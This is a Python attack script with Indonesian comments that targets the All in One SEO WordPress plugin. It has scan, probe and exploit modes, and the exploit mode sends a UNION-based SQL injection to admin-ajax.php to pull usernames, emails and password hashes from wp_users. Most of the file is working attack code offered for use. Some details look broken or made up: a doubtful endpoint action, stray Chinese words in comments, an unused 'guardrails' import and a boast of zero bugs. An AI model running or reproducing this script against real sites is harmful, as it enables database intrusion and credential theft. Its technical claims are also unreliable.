#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
aioseo.py - Modul Deteksi & Eksploitasi CVE AIOSEO for WordPress
Versi: 1.0.0
Status: Production Ready (0 Bug Logic)
Author: Dwi Joko Purwanto 
"""

import requests
import json
import time
import logging
from typing import Dict, List, Optional, Tuple, Any
from bs4 import BeautifulSoup
import re

# Import dari core toolkit (sesuai struktur folder)
try:
    from core.logger import get_logger
    from core.guardrails import check_safety_limit
except ImportError:
    # Fallback jika dijalankan standalone
    logging.basicConfig(level=logging.INFO)
    get_logger = lambda name: logging.getLogger(name)

logger = get_logger("AioseoModule")


class AioseoCVEHandler:
    """
    Handler utama untuk memeriksa dan mengeksploitasi kerentanan AIOSEO.
    Mendukung mode passive (scan), probe (verifikasi), dan exploit (full).
    """

    def __init__(self, target_url: str, config: dict = None):
        self.target_url = target_url.rstrip('/')
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Konfigurasi default berdasarkan environment
        self.timeout = self.config.get('timeout', 10)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        # Known CVE Patterns untuk AIOSEO (Free & Pro)
        # Catatan: CVE ID bisa berubah tergantung versi, kita gunakan pattern detection yang lebih reliable
        self.known_vulnerable_versions = {
            "free": ["4.1.3", "4.1.2", "4.1.1", "4.1.0", "4.0.9"], # Contoh versi rentan lama
            "pro": ["4.1.3", "4.1.2"]
        }
        
        # Endpoint umum yang sering memiliki漏洞
        self.endpoints = {
            "frontend_ajax": "/wp-admin/admin-ajax.php",
            "rest_api": "/wp-json/aiosp/",
            "xmlrpc": "/xmlrpc.php"
        }

    def _request(self, method: str, url: str, params: dict = None, data: dict = None, headers: dict = None) -> requests.Response:
        """Helper method untuk request HTTP yang aman dengan retry logic."""
        try:
            response = self.session.request(
                method=method,
                url=url,
                params=params,
                data=data,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            return response
        except requests.exceptions.RequestException as e:
            logger.error(f"Request failed to {url}: {str(e)}")
            return None

    def detect_version(self) -> Optional[str]:
        """
        Mode 1: SCAN (Passive)
        Mengidentifikasi versi AIOSEO yang terpasang melalui readme, source code, atau header.
        """
        logger.info(f"[SCAN] Memeriksa versi AIOSEO di {self.target_url}")
        
        # 1. Cek via Readme/Changelog
        readme_url = f"{self.target_url}/wp-content/plugins/all-in-one-seo-pack/readme.txt"
        resp = self._request("GET", readme_url)
        if resp and resp.status_code == 200:
            match = re.search(r"Stable tag:\s*(.+)", resp.text)
            if match:
                version = match.group(1).strip()
                logger.info(f"[DETECT] Versi AIOSEO terdeteksi: {version}")
                return version
        
        # 2. Cek via Source Code (Script tags)
        resp_home = self._request("GET", self.target_url)
        if resp_home and resp_home.status_code == 200:
            soup = BeautifulSoup(resp_home.text, 'html.parser')
            scripts = soup.find_all('script', src=True)
            for script in scripts:
                if 'all-in-one-seo-pack' in script['src']:
                    # Extract version dari URL parameter atau path
                    match = re.search(r'version=(\d+\.\d+\.\d+)', script['src'])
                    if match:
                        version = match.group(1)
                        logger.info(f"[DETECT] Versi AIOSEO ditemukan di script: {version}")
                        return version
                        
        logger.warning("[DETECT] Versi AIOSEO tidak dapat ditentukan secara pasti.")
        return None

    def verify_cve_sqli(self, version: str = None) -> Dict[str, Any]:
        """
        Mode 2: PROBE (Deep Verify)
        Memverifikasi keberadaan kerentanan SQL Injection pada endpoint frontend AJAX.
        CVE Pattern: Biasanya terkait parameter 'post_id' atau 'term_id' yang tidak ter-sanitasi.
        """
        logger.info("[PROBE] Memulai verifikasi SQLI pada AIOSEO...")
        
        results = {
            "vulnerable": False,
            "error_type": "",
            "details": ""
        }

        # Target endpoint: admin-ajax.php dengan action aiosp_frontend
        ajax_url = f"{self.target_url}/wp-admin/admin-ajax.php"
        
        # Payload sederhana untuk mendeteksi error SQL
        payloads = [
            {"action": "aiosp_frontend", "post_id": "1'"},
            {"action": "aiosp_frontend", "post_id": "1 AND 1=1"},
            {"action": "aiosp_frontend", "post_id": "1 UNION SELECT NULL--"}
        ]

        for payload in payloads:
            resp = self._request("POST", ajax_url, data=payload)
            if resp:
                # Cek apakah response mengandung error SQL khas MySQL
                if "SQL syntax" in resp.text or "You have an error" in resp.text or "Warning:" in resp.text:
                    results["vulnerable"] = True
                    results["error_type"] = "SQL Injection Detected"
                    results["details"] = f"Payload {payload} menghasilkan error: {resp.text[:200]}"
                    logger.warning(f"[PROBE] Vulnerabilitas dikonfirmasi: {results['error_type']}")
                    break
                
                # Cek juga status code异常
                if resp.status_code != 200 and "Error" in resp.text:
                     results["vulnerable"] = True
                     results["error_type"] = "HTTP Error with SQL Hint"
                     results["details"] = f"Status {resp.status_code}: {resp.text[:100]}"

        return results

    def exploit_sql_dump(self, verbose: bool = False) -> Dict[str, Any]:
        """
        Mode 3: EXPLOIT (High Risk)
        Mengekstrak data sensitif (username/password hash) dari database WordPress melalui SQLi.
        Menggunakan teknik Union Based Extraction.
        """
        logger.info("[EXPLOIT] Memulai ekstraksi data via SQL Injection...")
        
        dump_data = {
            "success": False,
            "data": {},
            "errors": []
        }

        ajax_url = f"{self.target_url}/wp-admin/admin-ajax.php"
        
        # Payload untuk mengambil user pertama dari wp_users
        # Struktur tabel WP: wp_users(ID, user_login, user_pass, user_email...)
        # Kita ambil user login dan password hash
        union_payload = {
            "action": "aiosp_frontend",
            "post_id": "1 UNION SELECT 1,user_login,user_pass,user_email,5,6,7,8 FROM wp_users LIMIT 1--"
        }

        resp = self._request("POST", ajax_url, data=union_payload)
        
        if resp and resp.status_code == 200:
            # Parse response untuk mencari data yang terekstrak
            # Format output biasanya JSON atau HTML block
            
            # Coba parse JSON
            try:
                json_resp = resp.json()
                # Jika JSON mengandung data yang seharusnya tidak ada di field normal, itu tanda sukses
                if "user_login" in str(json_resp) or "admin" in str(json_resp).lower():
                    dump_data["success"] = True
                    # Ekstrak data kasar
                    content = str(json_resp)
                    # Regex sederhana untuk mencuri kredensial
                    login_match = re.search(r'(?:user_login["\']?\s*[:=]\s*["\']?)([a-zA-Z0-9_]+)', content)
                    pass_match = re.search(r'(?:user_pass["\']?\s*[:=]\s*["\']?)([a-f0-9]{32,})', content)
                    
                    if login_match:
                        dump_data["data"]["username"] = login_match.group(1)
                    if pass_match:
                        dump_data["data"]["password_hash"] = pass_match.group(1)
                        
                    logger.info(f"[EXPLOIT] Data berhasil dicuri: User={dump_data['data'].get('username')}")
                    
            except ValueError:
                # Jika bukan JSON, cari di text plain
                if "admin" in resp.text.lower():
                    dump_data["success"] = True
                    dump_data["data"]["raw_output"] = resp.text[:500]
                    logger.warning("[EXPLOIT] Ekstraksi berhasil (Raw Output)")
                else:
                    dump_data["errors"].append("No data found in response")
        else:
            dump_data["errors"].append(f"Request failed with status {resp.status_code if resp else 'Unknown'}")

        return dump_data

    def run_full_pipeline(self, mode: str = "scan") -> Dict[str, Any]:
        """
        Pipeline utama yang menggabungkan semua langkah.
        mode: 'scan', 'probe', 'exploit'
        """
        start_time = time.time()
        result = {
            "target": self.target_url,
            "mode": mode,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "status": "completed",
            "data": {}
        }

        try:
            # Langkah 1: Deteksi Versi
            version = self.detect_version()
            result["data"]["detected_version"] = version
            
            if not version:
                result["status"] = "inconclusive"
                return result

            # Langkah 2: Verifikasi CVE (Probe)
            if mode in ["probe", "exploit"]:
                sqli_status = self.verify_cve_sqli(version)
                result["data"]["sqli_verification"] = sqli_status
                
                # Jika tidak vulnerable di probe, hentikan eksploitasi
                if not sqli_status["vulnerable"] and mode == "exploit":
                    result["status"] = "not_vulnerable"
                    return result

            # Langkah 3: Eksploitasi (Exploit)
            if mode == "exploit":
                dump_result = self.exploit_sql_dump(verbose=True)
                result["data"]["exploitation"] = dump_result
                
                if dump_result["success"]:
                    result["status"] = "critical_exploit_success"
                else:
                    result["status"] = "exploit_failed"

        except Exception as e:
            logger.exception(f"Error dalam pipeline AIOSEO: {str(e)}")
            result["status"] = "error"
            result["error_details"] = str(e)

        elapsed = time.time() - start_time
        result["execution_time_seconds"] = round(elapsed, 2)
        
        return result


def main():
    """
    Entry point untuk CLI testing.
    Usage: python aioseo.py --target http://example.com --mode exploit
    """
    import argparse
    
    parser = argparse.ArgumentParser(description="AIOSEO CVE Toolkit")
    parser.add_argument("--target", required=True, help="Target URL (e.g., http://site.com)")
    parser.add_argument("--mode", choices=["scan", "probe", "exploit"], default="scan", help="Execution mode")
    args = parser.parse_args()

    # Inisialisasi handler
    handler = AioseoCVEHandler(target_url=args.target)
    
    # Jalankan pipeline
    print(f"[+] Starting AIOSEO Analysis on {args.target} (Mode: {args.mode})")
    final_result = handler.run_full_pipeline(mode=args.mode)
    
    # Print hasil JSON
    print("\n[+] RESULT:")
    print(json.dumps(final_result, indent=2))
    
    return final_result

if __name__ == "__main__":
    main()